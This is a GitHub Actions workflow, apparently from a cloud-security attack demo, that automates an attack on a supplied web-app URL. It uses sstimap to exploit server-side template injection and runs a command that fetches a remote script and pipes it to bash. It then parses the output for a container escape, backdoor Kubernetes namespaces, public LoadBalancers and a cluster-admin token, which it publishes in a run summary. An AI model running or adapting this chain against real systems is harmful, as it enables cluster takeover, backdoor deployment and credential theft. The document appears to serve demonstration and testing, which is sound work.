name: Attack_WebApp-Container-Escape

on:
  workflow_dispatch:
    inputs:
      APP_URL:
        description: 'URL of the web application to attack'
        required: true
        default: '<CHANGE ME>'

jobs:
    attack-job:
        runs-on: ubuntu-latest
          
        steps:
            - name: Checkout repository
              uses: actions/checkout@v3

            - name: Run Full Attack
              id: attack
              run: |
                # Capture l'output complet
                OUTPUT=$(docker run chrisley75/sstimap:1.0.3 \
                  -u "${{ github.event.inputs.APP_URL }}page?name=attack" \
                  --os-cmd "curl -s https://raw.githubusercontent.com/cortex-cloud-demo/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash" 2>&1)
                
                echo "$OUTPUT"
                
                # VÃ©rifier si l'attaque a rÃ©ussi avec plusieurs indicateurs
                # 1. Rechercher la confirmation RCE de sstimap
                # 2. OU rechercher les URLs des backdoors dÃ©ployÃ©s
                if echo "$OUTPUT" | grep -q "Shell command execution:.*ok" || \
                   (echo "$OUTPUT" | grep -q "Hacked Application URL is:" && \
                    echo "$OUTPUT" | grep -qE "namespace/kubernetes-dashboard (created|unchanged)"); then
                  echo "attack_success=true" >> $GITHUB_OUTPUT
                  
                  # Extraire les informations importantes
                  HACKED_URL=$(echo "$OUTPUT" | grep "Hacked Application URL is:" | awk '{print $NF}')
                  DASHBOARD_URL=$(echo "$OUTPUT" | grep "Kubernetes Dashboard URL is:" | awk '{print $NF}')
                  # Extraire le token JWT (commence par eyJ)
                  TOKEN=$(echo "$OUTPUT" | grep -oE 'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' | head -n 1)
                  
                  # Sauvegarder dans les outputs
                  echo "hacked_url=$HACKED_URL" >> $GITHUB_OUTPUT
                  echo "dashboard_url=$DASHBOARD_URL" >> $GITHUB_OUTPUT
                  echo "token=$TOKEN" >> $GITHUB_OUTPUT
                else
                  echo "attack_success=false" >> $GITHUB_OUTPUT
                  
                  # Extraire les dÃ©tails de la vulnÃ©rabilitÃ© dÃ©tectÃ©e (si prÃ©sents)
                  ENGINE=$(echo "$OUTPUT" | grep "Engine:" | awk '{print $2}')
                  INJECTION=$(echo "$OUTPUT" | grep "Injection:" | awk '{print $2}')
                  CONTEXT=$(echo "$OUTPUT" | grep "Context:" | awk '{print $2}')
                  
                  echo "engine=$ENGINE" >> $GITHUB_OUTPUT
                  echo "injection=$INJECTION" >> $GITHUB_OUTPUT
                  echo "context=$CONTEXT" >> $GITHUB_OUTPUT
                fi
                
                # Sauvegarder l'output complet pour le summary
                echo "$OUTPUT" > attack_output.log
                
            - name: Generate Attack Summary
              if: always()
              run: |
                # Lire l'output
                OUTPUT=$(cat attack_output.log 2>/dev/null || echo "No output captured")
                
                # VÃ©rifier le succÃ¨s de l'attaque
                ATTACK_SUCCESS="${{ steps.attack.outputs.attack_success }}"
                
                # Capturer la date
                EXEC_TIME=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
                
                # CrÃ©er le GitHub Summary
                cat >> $GITHUB_STEP_SUMMARY << EOF
                # ðŸŽ¯ Security Test Results
                
                ## âš ï¸ Attack Summary
                
                **Target Application:** \`${{ github.event.inputs.APP_URL }}\`
                
                **Execution Time:** \`${EXEC_TIME}\`
                
                EOF
                
                if [ "$ATTACK_SUCCESS" = "true" ]; then
                  # Cas oÃ¹ l'attaque a rÃ©ussi
                  HACKED_URL="${{ steps.attack.outputs.hacked_url }}"
                  DASHBOARD_URL="${{ steps.attack.outputs.dashboard_url }}"
                  TOKEN="${{ steps.attack.outputs.token }}"
                  
                  cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                **Status:** âœ… Attack Chain Completed
                
                ---
                
                ## ðŸ”“ Compromised Resources
                
                ### 1. Container Escape
                ```
                âœ“ SSTI Vulnerability Exploited
                âœ“ Remote Code Execution Achieved
                âœ“ Container Breakout Successful
                âœ“ Kubernetes API Access Gained
                ```
                
                ### 2. Deployed Backdoors
                
                | Resource | Type | Status |
                |----------|------|--------|
                | Kubernetes Dashboard | Namespace | âœ… Deployed |
                | Hacked Application | Namespace | âœ… Deployed |
                | ServiceAccount | cluster-admin-sa | âœ… Created |
                | LoadBalancers | AWS ELB | âœ… Exposed |
                
                ---
                
                ## ðŸŒ Access Points
                
                ### Hacked Application
                EOF
                  
                  if [ ! -z "$HACKED_URL" ]; then
                    echo "**URL:** [$HACKED_URL]($HACKED_URL)" >> $GITHUB_STEP_SUMMARY
                  else
                    echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
                  fi
                  
                  cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                **Purpose:** Displays cluster information and provides kubectl access instructions
                
                ### Kubernetes Dashboard
                EOF
                  
                  if [ ! -z "$DASHBOARD_URL" ]; then
                    echo "**URL:** [$DASHBOARD_URL]($DASHBOARD_URL)" >> $GITHUB_STEP_SUMMARY
                  else
                    echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
                  fi
                  
                  cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                **Purpose:** Malicious dashboard with cluster-admin privileges
                
                ---
                
                ## ðŸ”‘ Extracted Credentials
                
                ### Cluster Admin Token
                
                > **âš ï¸ CRITICAL:** This token provides full cluster-admin access
                
                EOF
                  
                  if [ ! -z "$TOKEN" ]; then
                    echo '```' >> $GITHUB_STEP_SUMMARY
                    echo "$TOKEN" >> $GITHUB_STEP_SUMMARY
                    echo '```' >> $GITHUB_STEP_SUMMARY
                    
                    # DÃ©coder le token pour afficher des infos
                    echo "" >> $GITHUB_STEP_SUMMARY
                    echo "**Token Details:**" >> $GITHUB_STEP_SUMMARY
                    echo '```json' >> $GITHUB_STEP_SUMMARY
                    echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null || echo "Token payload (base64 encoded)" >> $GITHUB_STEP_SUMMARY
                    echo '```' >> $GITHUB_STEP_SUMMARY
                  else
                    echo "Token not captured in output" >> $GITHUB_STEP_SUMMARY
                  fi
                  
                  cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                ---
                
                ## ðŸŽ­ Attack Chain Visualization
                
                ```mermaid
                graph LR
                    A[Web App SSTI] -->|RCE| B[Container]
                    B -->|Escape| C[K8s API]
                    C -->|Create| D[ServiceAccount]
                    D -->|Extract| E[cluster-admin Token]
                    C -->|Deploy| F[Backdoor Apps]
                    F -->|Expose| G[Public LoadBalancers]
                    E -->|Full Access| H[Cluster Compromise]
                ```
                
                ---
                
                ## ðŸ“Š Deployed Resources
                
                ### Namespaces Created
                - `kubernetes-dashboard`
                - `hacked`
                
                ### Services Exposed
                - `kubernetes-dashboard` (LoadBalancer, Port 443)
                - `hacked-svc` (LoadBalancer, Port 8080)
                
                ### Malware Status
                ```
                âœ“ Download successful
                âœ“ Execution successful
                ```
                EOF
                
                else
                  # Cas oÃ¹ l'attaque a Ã©chouÃ©
                  ENGINE="${{ steps.attack.outputs.engine }}"
                  INJECTION="${{ steps.attack.outputs.injection }}"
                  CONTEXT="${{ steps.attack.outputs.context }}"
                  
                  cat >> $GITHUB_STEP_SUMMARY << EOF
                **Status:** âš ï¸ Vulnerability Detected - Exploitation Failed
                
                ---
                
                ## ðŸ” Vulnerability Analysis
                
                ### SSTI Detection Results
                
                | Property | Value |
                |----------|-------|
                | **Template Engine** | ${ENGINE:-Nunjucks} |
                | **Injection Point** | \`name\` parameter |
                | **Injection Payload** | ${INJECTION:-{{*}}} |
                | **Context** | ${CONTEXT:-text} |
                | **OS Detection** | âŒ Undetected |
                
                ---
                
                ## ðŸš« Failed Capabilities
                
                The SSTI vulnerability was detected but has **limited exploitation potential**:
                
                ```
                âœ“ Template injection confirmed
                âœ— Shell command execution: NO
                âœ— Bind and reverse shell: NO
                âœ— File write: NO
                âœ— File read: NO
                âœ— Code evaluation: NO
                ```
                
                ---
                
                ## ðŸ“Š Risk Assessment
                
                ### Current Status
                - **Vulnerability:** âš ï¸ SSTI Present
                - **Exploitability:** âœ… Low (sandboxed template)
                - **Impact:** ðŸŸ¡ Medium (information disclosure only)
                
                ### Possible Reasons for Limited Exploitation
                
                1. **Sandboxed Template Engine**
                   - Template engine is running in restricted mode
                   - Dangerous functions are disabled
                
                2. **WAF/Security Controls**
                   - Web Application Firewall may be blocking payloads
                   - Input sanitization in place
                
                3. **Container Security**
                   - Limited container permissions
                   - Network policies restricting outbound connections
                
                4. **Environment Restrictions**
                   - Read-only filesystem
                   - No shell binaries available
                
                ---
                
                ## ðŸ›¡ï¸ Security Recommendations
                
                ### Immediate Actions
                - âœ… **Good:** Template engine appears sandboxed
                - âš ï¸ **Warning:** SSTI vulnerability still exists
                - ðŸ”§ **Action Required:** Patch the template injection vulnerability
                
                ### Remediation Steps
                
                1. **Fix the SSTI vulnerability**
                   \`\`\`
                   - Sanitize user input before template rendering
                   - Use auto-escaping in templates
                   - Avoid direct template compilation from user input
                   \`\`\`
                
                2. **Implement additional security layers**
                   - Content Security Policy (CSP)
                   - Input validation and sanitization
                   - Regular security audits
                
                3. **Monitor for bypass attempts**
                   - Log all template rendering errors
                   - Alert on suspicious patterns
                   - Implement rate limiting
                
                ---
                
                ## ðŸŽ­ Failed Attack Chain
                
                \`\`\`mermaid
                graph LR
                    A[Web App SSTI] -->|Detected| B[Template Injection]
                    B -->|Blocked| C[Sandbox Restrictions]
                    C -.->|Failed| D[RCE Attempt]
                    C -.->|Failed| E[Container Escape]
                    C -.->|Failed| F[K8s Compromise]
                    
                    style C fill:#90EE90
                    style D fill:#FFB6C6
                    style E fill:#FFB6C6
                    style F fill:#FFB6C6
                \`\`\`
                
                **Legend:**
                - ðŸŸ¢ Green: Security control successful
                - ðŸ”´ Red: Attack vector blocked
                
                EOF
                
                fi
                
                # Section commune pour les deux cas
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                ---
                
                ## ðŸ“ Technical Details
                
                <details>
                <summary>Click to view full attack output</summary>
                
                ```
                EOF
                
                cat attack_output.log >> $GITHUB_STEP_SUMMARY 2>/dev/null || echo "Output log not available" >> $GITHUB_STEP_SUMMARY
                
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                ```
                
                </details>
                
                ---
                
                **Workflow Run:** `${{ github.run_id }}`  
                **Triggered by:** `${{ github.actor }}`  
                **Repository:** `${{ github.repository }}`
                EOF
                
            - name: Upload Attack Logs
              if: always()
              uses: actions/upload-artifact@v4
              with:
                name: attack-logs
                path: attack_output.log
                retention-days: 7